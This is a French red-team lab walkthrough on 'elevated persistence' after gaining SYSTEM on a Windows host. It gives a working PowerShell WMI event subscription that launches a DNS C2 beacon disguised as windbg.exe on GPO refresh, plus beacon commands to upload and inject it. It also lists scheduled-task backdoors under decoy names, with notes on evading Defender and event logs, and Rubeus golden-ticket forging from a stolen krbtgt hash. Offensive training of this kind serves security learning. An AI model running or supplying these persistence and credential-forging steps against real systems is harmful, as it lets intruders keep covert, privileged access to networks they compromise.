# Lab — Elevated Persistence

> **Contexte méthodologique :** il s’agit de la **phase 7 — Elevated Persistence**, après l’obtention d’un Beacon SYSTEM (phase 6, Privilege Escalation). Cette deuxième couche de persistence permet de retrouver un accès via une subscription WMI si la Blue Team supprime le COM hijack utilisateur (phase 4).

> **Pourquoi un DNS Beacon plutôt qu’un HTTP Beacon ?**
> - Le trafic DNS C2 se mélange aux requêtes DNS habituelles, compliquant son blocage sans perturber le réseau
> - Un HTTP listener peut être limité ou inspecté sur le port 80 ; DNS est souvent moins filtré en interne
> - Le déclencheur WMI s’exécute en SYSTEM sans session utilisateur ; DNS peut rester accessible lorsque HTTP est bloqué
> - Dans ce lab : DNS pour Elevated Persistence/SYSTEM, HTTP/SMB pour les Beacons interactifs

----

## WmiPersistence.ps1 — Subscription WMI sur événement GPO  

1. Créer le fichier `C:\Tools\WmiPersistence.ps1`  
2. Coller le code ci-dessous  

```powershell
function Add-WmiPersistence
{
   $EventFilterArgs = @{
      EventNamespace = 'root/cimv2'
      Name           = "Debug Trace"
      Query          = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND TargetInstance.EventCode = '1502'"
      QueryLanguage  = 'WQL'
   }
   $Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $EventFilterArgs

   $CommandLineConsumerArgs = @{
      Name                = "Debug Consumer"
      CommandLineTemplate = "C:\Windows\System32\windbg.exe -trace"
   }
   $Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $CommandLineConsumerArgs

   $FilterToConsumerArgs = @{
      Filter   = $Filter
      Consumer = $Consumer
   }
   Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $FilterToConsumerArgs
}

function Remove-WmiPersistence
{
    Get-WMIObject -Namespace root/Subscription -Class __EventFilter         -Filter "Name='Debug Trace'"    | Remove-WmiObject -Verbose
    Get-WMIObject -Namespace root/Subscription -Class CommandLineEventConsumer -Filter "Name='Debug Consumer'" | Remove-WmiObject -Verbose
    Get-WMIObject -Namespace root/Subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%Debug%'" | Remove-WmiObject -Verbose
}
```

>L’action est déclenchée à la mise à jour des Group Policy Objects (GPO).  
3. Générer un payload DNS.  
```
Payloads > Windows Stageless Payload
Listener: dns
Click Generate
Save to C:\Payloads\dns_x64.exe
```
4. Interagir avec le Beacon SYSTEM.  
5. Uploader le payload.
```
upload C:\Payloads\dns_x64.exe
mv dns_x64.exe windbg.exe
```
6. Installer la backdoor par self-injection.  
```
powershell-import C:\Tools\WmiPersistence.ps1
psinject [BEACON PID] x64 Add-WmiPersistence
```
7. Déclencher la backdoor depuis le Beacon
```
execute gpupdate /target:computer /force
```

----  

### Scheduled Task — Persistence de secours

| Risque | Commande | Explication |
|------|---------|-----|
| `OPSEC-CAUTION` ✅ | `powerpick Register-ScheduledTask -TaskName 'WindowsDebugHelper' -Action (New-ScheduledTaskAction -Execute 'C:\Windows\Temp\windbg.exe') -Trigger (New-ScheduledTaskTrigger -AtStartup) -RunLevel Highest -User 'SYSTEM' -Force` | Pas de `powershell.exe`. Le XML de la task est écrit sur disque et l’événement 4698 est généré. |
| `OPSEC-CAUTION` ✅ | `execute-assembly SharPersist.exe -t schtask -c "C:\Windows\Temp\windbg.exe" -n "WindowsDebugHelper" -m add -o logon` | Fork & run via `spawnto`. Même événement 4698, sans `powershell.exe`. |
| `OPSEC-UNSAFE` ❌ | `shell schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\windbg.exe" /sc onstart /ru SYSTEM /f` | Crée `cmd.exe` et `schtasks.exe`. La ligne de commande est visible par les callbacks kernel de Defender. |

> **Règle d’examen :** privilégier `powerpick`, puis `execute-assembly` lorsqu’ils conviennent. Utiliser `shell` en dernier recours et signaler le risque OPSEC **UNSAFE**.

### Golden Ticket — Persistence sans binaire sur disque

Une fois le hash AES256 de `krbtgt` récupéré avec DCSync, des tickets Kerberos Domain Admin peuvent être forgés sans binaire sur disque, subscription WMI ni Scheduled Task :

```cs
// On attacker desktop (NOT in beacon — run locally)
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /user:Administrator /domain:contoso.com /sid:<domain-SID> /aes256:<krbtgt-aes256> /outfile:C:\Users\Attacker\Desktop\golden

// Inject into beacon session when needed
beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\[GOLDEN].kirbi
beacon> run klist
beacon> ls \\lon-dc-1\c$   // verify DA access
```

> **Intérêt de cette persistence :** pas de processus ni de fichier supplémentaire sur la cible. Le ticket reste en mémoire côté attaquant jusqu’à la rotation du mot de passe `krbtgt` (60 jours par défaut selon les notes d’origine). L’opération DCSync peut générer l’événement 4662 lors de la collecte.

### Scheduled Task — Alternative si WMI est surveillé

```cs
// OPSEC-CAUTION — task XML written to C:\Windows\System32\Tasks\, Event 4698
beacon> powerpick $action = New-ScheduledTaskAction -Execute 'C:\Windows\Temp\windbg.exe'; $trigger = New-ScheduledTaskTrigger -AtStartup; Register-ScheduledTask -TaskName 'WindowsDebugHelper' -Action $action -Trigger $trigger -RunLevel Highest -User 'SYSTEM' -Force

// Verify
beacon> powerpick Get-ScheduledTask -TaskName 'WindowsDebugHelper'

// Cleanup
beacon> powerpick Unregister-ScheduledTask -TaskName 'WindowsDebugHelper' -Confirm:$false
```

> **Éviter `shell schtasks /create`** : la commande crée un child process `cmd.exe` depuis le Beacon (**OPSEC-UNSAFE**). Privilégier les cmdlets `ScheduledTask` via `powerpick`.


